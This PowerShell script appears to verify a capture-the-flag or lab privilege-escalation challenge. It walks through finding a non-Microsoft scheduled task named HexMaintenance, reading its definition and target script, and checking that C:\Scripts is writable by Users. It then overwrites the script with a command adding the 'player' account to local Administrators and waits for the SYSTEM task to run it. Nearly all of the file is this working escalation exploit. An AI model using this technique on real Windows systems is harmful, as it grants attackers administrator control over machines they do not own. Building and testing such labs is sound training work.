"=== DISCOVERY, as a student would ==="
$o = schtasks /query /fo LIST 2>&1
if ($o -match "HexMaintenance") { "  1. schtasks finds a non-Microsoft task: HexMaintenance" } else { "  1. FAIL: task not discoverable via schtasks" }
try { Get-Content C:\Windows\System32\Tasks\HexMaintenance -ErrorAction Stop | Select-String "UserId|Arguments" | ForEach-Object { "  2. " + $_.Line.Trim() } } catch { "  2. FAIL: task definition not readable" }
try { Get-Content C:\Scripts\maintenance.ps1 -ErrorAction Stop | Select-Object -First 2 | ForEach-Object { "  3. script says: " + $_ } } catch { "  3. FAIL: script not readable" }
(icacls C:\Scripts 2>&1 | Select-String "Users" | Select-Object -First 1) | ForEach-Object { "  4. ACL: " + $_.Line.Trim() }

"=== EXPLOIT ==="
Set-Content -Path C:\Scripts\maintenance.ps1 -Encoding ASCII -Value 'net localgroup Administrators player /add'
"  payload written (net localgroup, NOT Add-LocalGroupMember which is broken on this image)"

"=== WAIT for the SYSTEM task ==="
$won = $false
for ($i = 0; $i -lt 16; $i++) {
  Start-Sleep -Seconds 15
  $m = net localgroup Administrators 2>&1
  if ($m -match "player") { $won = $true; "  ESCALATED after $(($i+1)*15)s" ; break }
}
if (-not $won) { "  NOT escalated within 240s" }
